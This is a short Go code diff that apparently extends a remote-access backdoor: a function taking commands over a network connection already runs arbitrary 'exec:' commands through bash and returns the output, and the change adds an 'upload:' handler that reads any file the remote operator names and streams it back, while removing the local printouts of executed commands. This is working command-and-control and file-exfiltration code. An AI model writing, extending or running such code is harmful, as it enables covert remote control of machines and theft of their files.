@@ -7,6 +7,7 @@ import (
 	"os/exec"
 	"strings"
 	"bufio"
+	"io/ioutil"
 )
 
 
@@ -53,15 +54,29 @@ func parseCommand(cmdLine string, conn net.Conn) {
 		cmdStr := strings.TrimPrefix(cmdLine, "exec:")
 
 		cmd := exec.Command("bash", "-c", cmdStr)
-		fmt.Printf("[>] Executing command: %s\n", cmd)
 		output, err := cmd.CombinedOutput()
-		fmt.Printf("[>] Executing command: %s\n", output)
 		if err != nil {
 			output = []byte(err.Error())
 		}
 		conn.Write([]byte(string(output) + "\n"))
 	}else if strings.HasPrefix(cmdLine, "upload:") {
-		return
+		filePath := strings.TrimPrefix(cmdLine, "upload:")
+		filePath = strings.TrimSpace(filePath)
+
+		data, err := ioutil.ReadFile(filePath)
+		if err != nil {
+			conn.Write([]byte(fmt.Sprintf("[!] Failed to read file: %v\n", err)))
+			return
+		}
+
+		filename := filePath
+		if parts := strings.Split(filePath, "/"); len(parts) > 0 {
+			filename = parts[len(parts)-1]
+		}
+
+		conn.Write([]byte("BEGIN_FILE:" + filename + "\n"))
+		conn.Write(data)
+		conn.Write([]byte("\nEND_FILE\n"))
 	}else if strings.HasPrefix(cmdLine, "download:") {
 		return
 	}else{
